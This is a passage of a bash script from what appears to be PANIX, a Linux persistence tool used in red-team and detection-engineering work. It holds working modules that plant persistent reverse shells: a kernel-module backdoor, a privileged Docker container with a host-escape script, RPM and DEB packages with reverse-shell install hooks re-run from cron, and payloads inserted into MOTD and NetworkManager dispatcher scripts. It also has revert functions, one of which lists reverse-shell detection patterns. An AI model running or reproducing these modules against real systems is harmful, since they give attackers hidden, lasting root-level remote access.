	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --lkm --help' for more information."
		exit 1
	fi

	if ! command -v make &> /dev/null; then
		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install build-essential"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install make"
		exit 1
	fi

	if ! command -v gcc &> /dev/null; then
		echo "Error: 'gcc' is not installed. Please install 'gcc' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install gcc"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install gcc"
		exit 1
	fi

	KERNEL_HEADERS="/lib/modules/$(uname -r)/build"
	RESOLVED_HEADERS=$(readlink -f "$KERNEL_HEADERS")

	if [ ! -d "$RESOLVED_HEADERS" ]; then
		echo "Kernel headers not found. Please install the kernel headers for your system."
		echo "For Debian/Ubuntu: sudo apt install linux-headers-\$(uname -r)"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --lkm --help' for more information."
			exit 1
		fi

		# Populate the command for default mode
		# Ensure proper escaping for C string
		command="\"/bin/bash\",\"-c\",\"/bin/nohup /bin/setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'\",NULL"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $lkm_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --lkm --help' for more information."
			exit 1
		fi

		# Populate the command for custom mode
		# Ensure proper escaping for C string
		command="\"/bin/bash\",\"-c\",\"$command\",NULL"
		lkm_destination="$lkm_path"
		mkdir -p $(dirname $lkm_destination)
	fi

	mkdir -p ${lkm_compile_dir}

	cat <<-EOF > ${lkm_source}
	#include <linux/module.h>
	#include <linux/kernel.h>
	#include <linux/init.h>
	#include <linux/kthread.h>
	#include <linux/delay.h>
	#include <linux/signal.h>

	static struct task_struct *task;

	static int backdoor_thread(void *arg) {
		allow_signal(SIGKILL);
		while (!kthread_should_stop()) {
			char *argv[] = {$command};
			call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
			ssleep(60);
		}
		return 0;
	}

	static int __init lkm_backdoor_init(void) {
		printk(KERN_INFO "Loading LKM backdoor module\\n");
		task = kthread_run(backdoor_thread, NULL, "lkm_backdoor_thread");
		return 0;
	}

	static void __exit lkm_backdoor_exit(void) {
		printk(KERN_INFO "Removing LKM backdoor module\\n");
		if (task) {
			kthread_stop(task);
		}
	}

	module_init(lkm_backdoor_init);
	module_exit(lkm_backdoor_exit);

	MODULE_LICENSE("GPL");
	MODULE_AUTHOR("PANIX");
	MODULE_DESCRIPTION("LKM Backdoor");
	EOF

	# Check if the source file was created
	if [ ! -f "$lkm_source" ]; then
		echo "[-] Failed to create the kernel module source code at $lkm_source"
		exit 1
	else
		echo "[+] Kernel module source code created: $lkm_source"
	fi

	# Create the Makefile
	mkdir -p ${lkm_compile_dir}
cat <<EOF > ${lkm_compile_dir}/Makefile
obj-m += ${lkm_name}.o

all:
	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) modules

clean:
	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) clean
EOF

	if [ ! -f "${lkm_compile_dir}/Makefile" ]; then
		echo "[-] Failed to create the Makefile at ${lkm_compile_dir}/Makefile"
		exit 1
	else
		echo "[+] Makefile created: ${lkm_compile_dir}/Makefile"
	fi

	# Compile the kernel module using make
	cd ${lkm_compile_dir}
	make

	if [ $? -ne 0 ]; then
		echo "[-] Compilation failed. Exiting."
		exit 1
	fi

	# Copy the compiled module to the destination
	cp ${lkm_compile_dir}/${lkm_name}.ko ${lkm_destination}

	if [ $? -ne 0 ]; then
		echo "[-] Copying module failed. Exiting."
		exit 1
	fi

	echo "[+] Kernel module compiled successfully: ${lkm_destination}"

	sudo insmod ${lkm_destination}
	if [[ $? -ne 0 ]]; then
		echo "[-] Failed to load the kernel module. Check dmesg for errors."
		exit 1
	fi

	# Add kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
	echo "[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
	if [ -d "/etc/modules-load.d" ]; then
		echo "${lkm_name}" > /etc/modules-load.d/${lkm_name}.conf
	fi

	if [ -d "/usr/lib/modules-load.d" ]; then
		echo "${lkm_name}" > /usr/lib/modules-load.d/${lkm_name}.conf
	fi

	if [ -f "/etc/modules" ]; then
		if ! grep -q "^${lkm_name}$" /etc/modules; then
			echo "${lkm_name}" >> /etc/modules
		fi
	fi

	echo "[+] Kernel module loaded successfully. Check dmesg for the output."
	echo "[+] Kernel module added to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/"
	echo "[+] LKM backdoor established!"
}

# Revert Module: revert_lkm.sh
revert_lkm() {
	usage_revert_lkm() {
		echo "Usage: ./panix.sh --revert lkm"
		echo "Reverts any changes made by the setup_lkm_backdoor module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	local lkm_name="panix"
	local lkm_compile_dir="/tmp/lkm"
	local lkm_destination="/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko"
	local lkm_module_name="${lkm_name}"

	# Unload the kernel module if it is loaded
	if lsmod | grep -q "^${lkm_module_name} "; then
		echo "[+] Unloading kernel module '${lkm_module_name}'..."
		rmmod "${lkm_module_name}"
		if [[ $? -eq 0 ]]; then
			echo "[+] Kernel module '${lkm_module_name}' unloaded successfully."
		else
			echo "[-] Failed to unload kernel module '${lkm_module_name}'."
		fi
	else
		echo "[-] Kernel module '${lkm_module_name}' is not loaded."
	fi

	# Remove the kernel module file
	if [[ -f "${lkm_destination}" ]]; then
		echo "[+] Removing kernel module file '${lkm_destination}'..."
		rm -f "${lkm_destination}"
		if [[ $? -eq 0 ]]; then
			echo "[+] Kernel module file '${lkm_destination}' removed successfully."
		else
			echo "[-] Failed to remove kernel module file '${lkm_destination}'."
		fi
	else
		echo "[-] Kernel module file '${lkm_destination}' not found."
	fi

	# Clean up the compile directory
	if [[ -d "${lkm_compile_dir}" ]]; then
		echo "[+] Removing temporary directory '${lkm_compile_dir}'..."
		rm -rf "${lkm_compile_dir}"
		if [[ $? -eq 0 ]]; then
			echo "[+] Temporary directory '${lkm_compile_dir}' removed successfully."
		else
			echo "[-] Failed to remove temporary directory '${lkm_compile_dir}'."
		fi
	else
		echo "[-] Temporary directory '${lkm_compile_dir}' not found."
	fi

	# Remove panix from /etc/modules, /etc/modules-load.d/panix.conf and /usr/lib/modules-load.d/panix.conf
	echo "[+] Removing panix from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
	sed -i '/panix/d' /etc/modules
	rm -f /etc/modules-load.d/panix.conf
	rm -f /usr/lib/modules-load.d/panix.conf

	# Update module dependencies
	echo "[+] Updating module dependencies..."
	depmod -a
	echo "[+] Module dependencies updated."

	return 0
}

# Module: setup_malicious_docker_container.sh
setup_malicious_docker_container() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_docker_container() {
		echo "Usage: ./panix.sh --malicious-container [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--help|-h)
				usage_malicious_docker_container
				exit 0
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --malicious-container --default --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			* )
				echo "Invalid option for --malicious-container: $1"
				echo "Try './panix.sh --malicious-container --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './panix.sh --malicious-container --help' for more information."
		exit 1
	fi

	if ! docker ps &> /dev/null; then
		echo "Error: Docker daemon is not running or permission denied."
		exit 1
	fi

	# Dockerfile setup and Docker image creation
	DOCKERFILE="/tmp/Dockerfile"
	cat <<-EOF > $DOCKERFILE
	FROM alpine:latest

	RUN apk add --no-cache bash socat sudo util-linux procps

	RUN adduser -D lowprivuser

	RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
		&& echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
		&& chmod +x /usr/local/bin/entrypoint.sh

	RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
		&& echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
		&& chmod +x /usr/local/bin/escape.sh \\
		&& echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers

	USER lowprivuser

	ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
	EOF

	# Building and running the Docker container
	docker build -t malicious-container -f $DOCKERFILE . && \
	docker run -d --name malicious-container --privileged --pid=host malicious-container

	echo "[+] Malicious Docker container created and running."
	echo "[+] Reverse shell is executed every minute."
	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
	echo "[+] Docker container persistence established!" 
}

# Revert Module: revert_malicious_docker_container.sh
revert_malicious_container() {
	usage_revert_malicious_container() {
		echo "Usage: ./panix.sh --revert malicious-container"
		echo "Reverts any changes made by the setup_malicious_docker_container module."
	}

	# Check if Docker is available
	if ! docker ps &> /dev/null; then
		echo "Error: Docker daemon is not running or permission denied."
		return 1
	fi

	# Stop and remove the malicious container
	if docker ps -a --format '{{.Names}}' | grep -q '^malicious-container$'; then
		echo "[+] Stopping and removing the 'malicious-container'..."
		docker stop malicious-container >/dev/null 2>&1
		docker rm malicious-container >/dev/null 2>&1
		echo "[+] Container 'malicious-container' stopped and removed."
	else
		echo "[-] Container 'malicious-container' not found. No action needed."
	fi

	# Remove the Docker image
	if docker images -q malicious-container > /dev/null 2>&1; then
		echo "[+] Removing Docker image 'malicious-container'..."
		docker rmi malicious-container -f >/dev/null 2>&1
		echo "[+] Docker image 'malicious-container' removed."
	else
		echo "[-] Docker image 'malicious-container' not found. No action needed."
	fi

	# Remove the Dockerfile
	DOCKERFILE="/tmp/Dockerfile"
	if [[ -f "$DOCKERFILE" ]]; then
		echo "[+] Removing Dockerfile at $DOCKERFILE..."
		rm -f "$DOCKERFILE"
		echo "[+] Dockerfile removed."
	else
		echo "[-] Dockerfile at $DOCKERFILE not found. No action needed."
	fi

	return 0
}

# Module: setup_malicious_package.sh
setup_malicious_package() {
	local ip=""
	local port=""
	local mechanism=""
	local os_version=""
	local architecture=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_package() {
		echo "Usage: ./setup.sh --malicious-package [OPTIONS]"
		echo "--examples            Display command examples"
		echo "--ip <ip>             Specify IP address"
		echo "--port <port>         Specify port number"
		echo "--rpm                 Use RPM package manager"
		echo "--dpkg                Use DPKG package manager"
		echo "--help|-h             Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--rpm )
				mechanism="$1"
				;;
			--dpkg )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --malicious-package --ip 10.10.10.10 --port 1337 --rpm | --dpkg"
				exit 0
				;;
			--help | -h )
				usage_malicious_package
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './setup.sh --malicious-package --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --rpm or --dpkg must be specified."
		echo "Try './setup.sh --malicious-package --help' for more information."
		exit 1
	fi

	case $mechanism in
		--rpm )
			if ! command -v rpm &> /dev/null; then
					echo "Warning: RPM does not seem to be available. It might not work."
					return 1
			fi

			if ! command -v rpmbuild &> /dev/null; then
					echo "Error: rpmbuild is not installed."
					exit 1
			fi

			# Ensure the directory structure exists
			mkdir -p ~/rpmbuild/SPECS
			mkdir -p ~/rpmbuild/BUILD
			mkdir -p ~/rpmbuild/RPMS
			mkdir -p ~/rpmbuild/SOURCES
			mkdir -p ~/rpmbuild/SRPMS

			# RPM package setup
			PACKAGE_NAME="panix"
			PACKAGE_VERSION="1.0"
			cat <<-EOF > ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
			Name: ${PACKAGE_NAME}
			Version: ${PACKAGE_VERSION}
			Release: 1%{?dist}
			Summary: RPM package with payload script
			License: MIT

			%description
			RPM package with a payload script that executes a reverse shell.

			%prep
			# No need to perform any preparation actions

			%install
			# Create directories
			mkdir -p %{buildroot}/usr/bin

			%files
			# No need to specify any files here since the payload is embedded

			%post
			# Trigger payload after installation
			nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &

			%clean
			rm -rf %{buildroot}

			%changelog
			* $(date +'%a %b %d %Y') John Doe <john.doe@example.com> 1.0-1
			- Initial package creation
			EOF
			# Build RPM package
			rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec

			# Install RPM package with forced overwrite
			VER=$(grep VERSION_ID /etc/os-release | cut -d '"' -f 2 | cut -d '.' -f 1)
			rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm
			mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
			rm -rf /root/rpmbuild
			# Add crontab entry for the current user
			echo "*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm > /dev/null 2>&1" | crontab -
			;;

		--dpkg )

			if ! command -v dpkg &> /dev/null; then
				echo "Warning: DPKG does not seem to be available. It might not work."
			fi

			# DPKG package setup
			PACKAGE_NAME="panix"
			PACKAGE_VERSION="1.0"
			DEB_DIR="${PACKAGE_NAME}/DEBIAN"
			PAYLOAD="#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &"

			# Create directory structure
			mkdir -p ${DEB_DIR}

			# Write postinst script
			echo -e "${PAYLOAD}" > ${DEB_DIR}/postinst
			chmod +x ${DEB_DIR}/postinst

			# Write control file
			echo "Package: ${PACKAGE_NAME}" > ${DEB_DIR}/control
			echo "Version: ${PACKAGE_VERSION}" >> ${DEB_DIR}/control
			echo "Architecture: all" >> ${DEB_DIR}/control
			echo "Maintainer: https://github.com/Aegrah/PANIX" >> ${DEB_DIR}/control
			echo "Description: This malicious package was added through PANIX" >> ${DEB_DIR}/control

			# Build the .deb package
			dpkg-deb --build ${PACKAGE_NAME}

			# Install the .deb package
			dpkg -i ${PACKAGE_NAME}.deb

			rm -rf ${PACKAGE_NAME}
			rm -rf ${DEB_DIR}

			# Add crontab entry for the current user
			echo "*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure > /dev/null 2>&1" | crontab -
			;;

		* )
			echo "Invalid mechanism specified."
			exit 1
			;;
	esac
	echo "[+] Malicious package persistence established."
}

# Revert Module: revert_malicious_package.sh
revert_malicious_package() {
	usage_revert_malicious_package() {
		echo "Usage: ./panix.sh --revert malicious-package"
		echo "Reverts any changes made by the setup_malicious_package module."
	}

	echo "[+] Reverting malicious package..."

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	local mechanism=""
	local PACKAGE_NAME="panix"

	# Detect if RPM or DPKG was used
	if command -v rpm &> /dev/null && rpm -qa | grep -q "^${PACKAGE_NAME}"; then
		mechanism="rpm"
	elif command -v dpkg &> /dev/null && dpkg -l | grep -q "^ii  ${PACKAGE_NAME} "; then
		mechanism="dpkg"
	else
		echo "[-] Malicious package '${PACKAGE_NAME}' not found via RPM or DPKG. No action needed."
	fi

	if [[ "$mechanism" == "rpm" ]]; then
		echo "[+] Removing RPM package '${PACKAGE_NAME}'..."
		rpm -e --noscripts "${PACKAGE_NAME}"
		if [[ $? -eq 0 ]]; then
			echo "[+] RPM package '${PACKAGE_NAME}' removed successfully."
		else
			echo "[-] Failed to remove RPM package '${PACKAGE_NAME}'."
		fi

		# Remove the RPM file from /var/lib/rpm
		if [[ -f "/var/lib/rpm/${PACKAGE_NAME}.rpm" ]]; then
			echo "[+] Removing RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm'..."
			rm -f "/var/lib/rpm/${PACKAGE_NAME}.rpm"
			echo "[+] RPM file removed."
		else
			echo "[-] RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm' not found."
		fi

	elif [[ "$mechanism" == "dpkg" ]]; then
		echo "[+] Removing DPKG package '${PACKAGE_NAME}'..."
		dpkg --purge "${PACKAGE_NAME}"
		if [[ $? -eq 0 ]]; then
			echo "[+] DPKG package '${PACKAGE_NAME}' removed successfully."
		else
			echo "[-] Failed to remove DPKG package '${PACKAGE_NAME}'."
		fi
	fi

	# Remove the cron job added by the setup function
	echo "[+] Removing cron job associated with '${PACKAGE_NAME}'..."
	# Create a temporary file to store the current crontab
	crontab -l > /tmp/current_cron$$ 2>/dev/null
	if [[ $? -ne 0 ]]; then
		echo "[-] No crontab for user $(whoami). No action needed."
		rm -f /tmp/current_cron$$
	else
		# Remove lines containing the malicious package commands
		grep -v ".*${PACKAGE_NAME}.*" /tmp/current_cron$$ > /tmp/new_cron$$
		# Install the new crontab
		crontab /tmp/new_cron$$
		echo "[+] Cron job removed."
		# Clean up temporary files
		rm -f /tmp/current_cron$$ /tmp/new_cron$$
	fi

	# Clean up any remaining build directories (RPM)
	if [[ -d "~/rpmbuild" ]]; then
		echo "[+] Removing RPM build directory '~/rpmbuild'..."
		rm -rf ~/rpmbuild
		echo "[+] RPM build directory removed."
	fi

	# Clean up any remaining package directories (DPKG)
	if [[ -d "${PACKAGE_NAME}" ]]; then
		echo "[+] Removing package directory '${PACKAGE_NAME}'..."
		rm -rf "${PACKAGE_NAME}"
		echo "[+] Package directory removed."
	fi

	# Remove any lingering files in /var/lib/dpkg/info (DPKG)
	if [[ -d "/var/lib/dpkg/info" ]]; then
		echo "[+] Cleaning up '/var/lib/dpkg/info'..."
		rm -f "/var/lib/dpkg/info/${PACKAGE_NAME}."*
		echo "[+] Cleanup completed."
	fi

	# Remove any package files left in the home directory
	if [[ -f "~/${PACKAGE_NAME}.deb" || -f "~/${PACKAGE_NAME}.rpm" ]]; then
		echo "[+] Removing package files '~/${PACKAGE_NAME}.deb' and/or '~/${PACKAGE_NAME}.rpm'..."
		rm -f ~/${PACKAGE_NAME}.deb ~/${PACKAGE_NAME}.rpm
		echo "[+] Package files removed."
	fi

	return 0
}

# Module: setup_motd_backdoor.sh
setup_motd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_motd_backdoor() {
		echo "Usage: ./panix.sh --motd [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default MOTD settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom MOTD settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom MOTD file path in /etc/update-motd.d/"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --motd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --motd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' & disown\" --path \"/etc/update-motd.d/137-python-upgrades\""
				exit 0
				;;
			--help|-h)
				usage_motd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --motd-backdoor: $1"
				echo "Try './panix.sh --motd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --motd --help' for more information."
			exit 1
		fi
		mkdir -p /etc/update-motd.d
		path="/etc/update-motd.d/137-python-upgrades"
		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown" > $path
		chmod +x $path
		echo "[+] MOTD backdoor established in $path"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --motd --help' for more information."
			exit 1
		fi

		if [[ ! -f $path ]]; then
			mkdir -p /etc/update-motd.d
			echo -e "#!/bin/sh\n$command" > $path
			chmod +x $path
		else
			# Read the first line and the rest of the file separately
			first_line=$(head -n 1 $path)
			rest_of_file=$(tail -n +2 $path)
			echo -e "#!/bin/sh\n$command\n${rest_of_file}" > $path
		fi
		echo "[+] MOTD backdoor persistence established!"
	fi
}

# Revert Module: revert_motd_backdoor.sh
revert_motd() {
	usage_revert_motd() {
		echo "Usage: ./panix.sh --revert motd"
		echo "Reverts any changes made by the setup_motd_backdoor module."
	}

	# Ensure the function is run as root
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Function to remove a file if it exists
	remove_file() {
		local file_path="$1"
		if [[ -f "$file_path" ]]; then
			rm -f "$file_path"
			echo "[+] Removed file: $file_path"
		else
			echo "[-] File not found: $file_path"
		fi
	}

	# Function to remove a MOTD backdoor script if it contains malicious commands
	remove_motd_script() {
		local script_path="$1"
		# Define patterns that indicate a reverse shell
		local patterns=("bash -i >& /dev/tcp" "nohup setsid /bin/sh " "bash -c 'sh -i" "setsid nohup")
		
		for pattern in "${patterns[@]}"; do
			if grep -q "$pattern" "$script_path"; then
				echo "[+] Identified malicious MOTD script: $script_path"
				remove_file "$script_path"
				return
			fi
		done
	}

	# Remove default MOTD backdoor script
	default_motd_path="/etc/update-motd.d/137-python-upgrades"
	echo "[+] Removing default MOTD backdoor script..."
	
	if [[ -f "$default_motd_path" ]]; then
		remove_motd_script "$default_motd_path"
	fi

	# Search and remove custom MOTD backdoor scripts
	echo "[+] Searching for custom MOTD backdoor scripts in /etc/update-motd.d/..."
	for motd_script in /etc/update-motd.d/*; do
		# Ensure it's a regular file
		if [[ ! -f "$motd_script" ]]; then
			continue
		fi

		# Exclude default scripts based on naming convention (e.g., 00-header, 10-help-text)
		script_basename=$(basename "$motd_script")
		if [[ "$script_basename" =~ ^[0-9]{2,3}- ]]; then
			# Check for malicious patterns
			remove_motd_script "$motd_script"
		fi
	done

	# Reload MOTD to apply changes
	echo "[+] Reloading MOTD rules..."
	if command -v run-parts &>/dev/null; then
		run-parts /etc/update-motd.d/ &> /dev/null
		echo "[+] MOTD rules reloaded using run-parts."
	else
		echo "[-] run-parts command not found. Skipping MOTD reload."
	fi

	return 0
}

# Module: setup_network_manager.sh
setup_network_manager() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local payload=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_network_manager() {
		echo "Usage: ./panix.sh --network-manager [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default NetworkManager settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom NetworkManager settings"
		echo "  --payload <payload>          Specify custom payload"
		echo "--help|-h                    Show this help message"
	}

	# Process options so that we know what payload to use
	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--payload )
				shift
				payload=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --network-manager --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --network-manager --custom --payload 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
				exit 0
				;;
			--help|-h)
				usage_network_manager
				exit 0
				;;
			* )
				echo "Invalid option for --network-manager: $1"
				echo "Try './panix.sh --network-manager --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --network-manager --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --network-manager --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --network-manager --help' for more information."
			exit 1
		fi
		payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown"
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $payload ]]; then
			echo "Error: --payload must be specified when using --custom."
			echo "Try './panix.sh --network-manager --help' for more information."
			exit 1
		fi
	fi

	if ! command -v NetworkManager &>/dev/null; then
		echo "Error: NetworkManager is not installed or not in PATH."
		echo "You can install it with:"
		echo "sudo apt install network-manager"
		echo "sudo dnf/yum install NetworkManager"
		echo "sudo pacman -S networkmanager"
		echo ""
		echo "[!] Warning: If the package requires installation, the technique might not work out of the box, as NetworkManager might not be used by default!"
		exit 1
	fi

	if [[ ! -d /etc/NetworkManager/dispatcher.d/ ]]; then
		echo "Error: /etc/NetworkManager/dispatcher.d/ does not exist. NetworkManager is not configured."
		exit 1
	fi

	local dispatcher_file="/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh"

	# Create the dispatcher file if it does not exist,
	# using a quoted heredoc to prevent variable expansion.
	if [[ ! -f $dispatcher_file ]]; then
		cat <<'EOF' > "$dispatcher_file"
#!/bin/sh -e

if [ "$2" = "connectivity-change" ]; then
	exit 0
fi

if [ -z "$1" ]; then
	echo "$0: called with no interface" 1>&2
	exit 1
fi

if [ -n "$IP4_NUM_ADDRESSES" ] && [ "$IP4_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet"
fi
if [ -n "$IP6_NUM_ADDRESSES" ] && [ "$IP6_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet6"
fi

# If we have a VPN connection ignore the underlying IP address(es)
if [ "$2" = "vpn-up" ] || [ "$2" = "vpn-down" ]; then
	ADDRESS_FAMILIES=""
fi

if [ -n "$VPN_IP4_NUM_ADDRESSES" ] && [ "$VPN_IP4_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet"
fi
if [ -n "$VPN_IP6_NUM_ADDRESSES" ] && [ "$VPN_IP6_NUM_ADDRESSES" -gt 0 ]; then
	ADDRESS_FAMILIES="$ADDRESS_FAMILIES inet6"
fi

# We're probably bringing the interface down.
[ -n "$ADDRESS_FAMILIES" ] || ADDRESS_FAMILIES="inet"

# Fake ifupdown environment
export IFACE="$1"
export LOGICAL="$1"
export METHOD="NetworkManager"
export VERBOSITY="0"

for i in $ADDRESS_FAMILIES; do
	export ADDRFAM="$i"

	# Run the right scripts
	case "$2" in
		up|vpn-up)
			export MODE="start"
			export PHASE="post-up"
			run-parts /etc/network/if-up.d
			;;
		down|vpn-down)
			export MODE="stop"
			export PHASE="post-down"
			run-parts /etc/network/if-post-down.d
			;;
		hostname|dhcp4-change|dhcp6-change)
			# Do nothing
			;;
		*)
			echo "$0: called with unknown action \`$2'" 1>&2
			exit 1
			;;
	esac
done

# Insert payload here:
__PAYLOAD_PLACEHOLDER__
EOF

		chmod +x "$dispatcher_file"
		echo "[+] Created new dispatcher file: $dispatcher_file"
	fi

	# Replace the placeholder with the actual payload if present.
	if grep -q "__PAYLOAD_PLACEHOLDER__" "$dispatcher_file"; then
		# Escape the payload for use in sed
		local escaped_payload
		escaped_payload=$(printf '%s\n' "$payload" | sed 's/[\/&]/\\&/g')
		sed -i "s/__PAYLOAD_PLACEHOLDER__/$escaped_payload/" "$dispatcher_file"
		echo "[+] Replaced payload placeholder with actual payload."
	else
		# If the file already exists and no placeholder is found,
		# check if the payload is already present.
		if grep -qF "$payload" "$dispatcher_file"; then
			echo "[+] Payload already exists in $dispatcher_file."
		else
			echo "[+] Adding payload to $dispatcher_file..."
			echo "$payload" >> "$dispatcher_file"
			chmod +x "$dispatcher_file"
			echo "[+] Payload added successfully."
		fi
	fi

	echo "[+] Using dispatcher file: $dispatcher_file"
}

# Revert Module: revert_network_manager.sh
revert_network_manager() {
	usage_revert_network_manager() {
		echo "Usage: ./panix.sh --revert network-manager"
		echo "Reverts any changes made by the setup_network-manager module."
	}
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	local dispatcher_file="/etc/NetworkManager/dispatcher.d/01-ifupdown"
